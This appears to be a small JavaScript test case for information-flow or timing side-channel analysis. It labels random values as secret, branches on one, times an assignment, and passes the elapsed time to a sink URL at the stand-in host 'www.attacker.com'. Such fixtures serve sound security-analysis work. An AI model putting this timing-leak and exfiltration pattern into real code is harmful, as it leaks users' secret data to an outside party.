var i =  Math.floor((Math.random() * 10) + 1); 
var i0 =  Math.floor((Math.random() * 10) + 1); 
var i1 =  Math.floor((Math.random() * 10) + 1); 

var h = lbl(i);
var h0 = lbl(i0);
var h1 = lbl(i1);

if (h > 5) {h0 = h1;} 

var t0 =  Date.now();

h0 = h1;

var t1 = Date.now()

url = urll("www.attacker.com" + (t1-t0));
sink('Sink', '', url);

